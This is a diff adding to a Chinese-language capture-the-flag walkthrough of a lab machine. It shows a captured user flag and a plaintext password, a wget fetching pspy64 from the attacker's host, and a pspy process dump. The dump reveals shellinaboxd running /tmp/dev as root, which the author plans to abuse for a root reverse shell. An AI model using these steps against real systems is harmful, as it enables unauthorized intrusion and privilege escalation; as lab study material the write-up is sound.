@@ -153,5 +153,102 @@ sudo vim /etc/hosts
 使用这个用户密码ssh|  2 | rocio   | Ihaveaflower        |
 使用上面的密码获取一个web 版的ssh（shellinabox：一款使用 AJAX 的基于 Web 的终端模拟器）
 
+rocio@bah:~$ cat user.txt                                                    
+HdsaMoiuVdsaeqw                                                              
+
+su qpmadmin //qpmpazzw
 
 ```
+
+上传pspy64查看root进程
+```c
+qpmadmin@bah:~$ wget http://192.168.44.128:1234/pspy64
+--2024-04-19 03:13:46--  http://192.168.44.128:1234/pspy64                   
+Connecting to 192.168.44.128:1234... connected.                              
+HTTP request sent, awaiting response... 200 OK                               
+Length: 3104768 (3.0M)                                                       
+Saving to: ‘pspy64’                                                          
+                                                                             
+pspy64              100%[================>]   2.96M  --.-KB/s    in 0.1s     
+                                                                             
+2024-04-19 03:13:46 (28.6 MB/s) - ‘pspy64’ saved [3104768/3104768]           
+                                                                             
+qpmadmin@bah:~$ ls                                                           
+pspy64                                                                       
+qpmadmin@bah:~$ chmod +x pspy64                                              
+qpmadmin@bah:~$ ./pspy64                                                     
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+                                                                             
+                                                                             
+     ██▓███    ██████  ██▓███ ▓██   ██▓                                      
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                      
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                      
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                      
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                      
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                       
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                       
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                        
+                   ░           ░ ░                                           
+                               ░ ░                                           
+                                                                             
+Config: Printing events (colored=true): processes=true | file-system-events=f
+alse ||| Scanning for processes every 100ms and on inotify events ||| Watchin
+g directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursi
+ve)                                                                          
+Draining file system events due to startup...                                
+done                                                                         
+2024/04/19 03:14:06 CMD: UID=1001  PID=996    | ./pspy64 
+2024/04/19 03:14:06 CMD: UID=0     PID=993    | 
+2024/04/19 03:14:06 CMD: UID=1001  PID=930    | bash 
+2024/04/19 03:14:06 CMD: UID=0     PID=929    | su qpmadmin 
+2024/04/19 03:14:06 CMD: UID=1000  PID=910    | -bash 
+2024/04/19 03:14:06 CMD: UID=1000  PID=905    | (sd-pam) 
+2024/04/19 03:14:06 CMD: UID=1000  PID=903    | /lib/systemd/systemd --user 
+2024/04/19 03:14:06 CMD: UID=0     PID=897    | login -p -h 127.0.0.1 
+2024/04/19 03:14:06 CMD: UID=0     PID=881    | 
+2024/04/19 03:14:06 CMD: UID=0     PID=858    | dhclient ens33 
+2024/04/19 03:14:06 CMD: UID=0     PID=854    | 
+2024/04/19 03:14:06 CMD: UID=0     PID=659    | dhclient ens33 
+2024/04/19 03:14:06 CMD: UID=0     PID=638    | dhclient ens33 
+2024/04/19 03:14:06 CMD: UID=0     PID=634    | -bash 
+2024/04/19 03:14:06 CMD: UID=0     PID=629    | (sd-pam) 
+2024/04/19 03:14:06 CMD: UID=0     PID=628    | /lib/systemd/systemd --user 
+2024/04/19 03:14:06 CMD: UID=106   PID=556    | /usr/sbin/mariadbd 
+2024/04/19 03:14:06 CMD: UID=33    PID=537    | php-fpm: pool www            
+                                                                             
+2024/04/19 03:14:06 CMD: UID=33    PID=536    | php-fpm: pool www            
+                                                                             
+2024/04/19 03:14:06 CMD: UID=33    PID=530    | nginx: worker process        
+                                                                             
+2024/04/19 03:14:06 CMD: UID=0     PID=524    | nginx: master process /usr/sb
+in/nginx -g daemon on; master_process on;                                    
+2024/04/19 03:14:06 CMD: UID=107   PID=513    | /usr/bin/shellinaboxd -q --ba
+ckground=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellin
+abox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabl
+ed/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_
+White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color 
+Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css -
+-no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/
+dev                                                                          
+2024/04/19 03:14:06 CMD: UID=107   PID=511    | /usr/bin/shellinaboxd -q --ba
+ckground=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 4200 -u shellin
+abox -g shellinabox --user-css Black on White:+/etc/shellinabox/options-enabl
+ed/00+Black on White.css,White On Black:-/etc/shellinabox/options-enabled/00_
+White On Black.css;Color Terminal:+/etc/shellinabox/options-enabled/01+Color 
+Terminal.css,Monochrome:-/etc/shellinabox/options-enabled/01_Monochrome.css -
+-no-beep --disable-ssl --localhost-only -s/:LOGIN -s /devel:root:root:/:/tmp/
+dev                                                                          
+2024/04/19 03:14:06 CMD: UID=0     PID=472    | 
+2024/04/19 03:14:06 CMD: UID=0     PID=468    | /bin/login -p --      
+2024/04/19 03:14:06 CMD: UID=0     PID=448    | /lib/systemd/systemd-logind 
+2024/04/19 03:14:06 CMD: UID=0     PID=443    | /usr/sbin/rsyslogd -n -iNONE 
+2024/04/19 03:14:06 CMD: UID=0     PID=440    | php-fpm: master process (/etc
+/php/7.4/fpm/php-fpm.conf)                                                   
+2024/04/19 03:14:06 CMD: UID=104   PID=430    | /usr/bin/dbus-daemon --system
+ --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only  
+2024/04/19 03:14:06 CMD: UID=0     PID=429    | /usr/sbin/cron -f 
+2024/04/19 03:14:06 CMD: UID=101   PID=401    | /lib/systemd/systemd-timesync
+d                                                                            
+2024/04/19 03:14:06 CMD: UID=0     PID=384    | 
+```
+这里可以看到一个shellinaboxd的命令。 -s 是用于启动服务。程序中的/devel将由用户root调用目标机器的/tmp/dev。因此，我们可以在 /tmp 上创建一个名为“dev”的可执行脚本，这将为我们提供一个反向 shell。
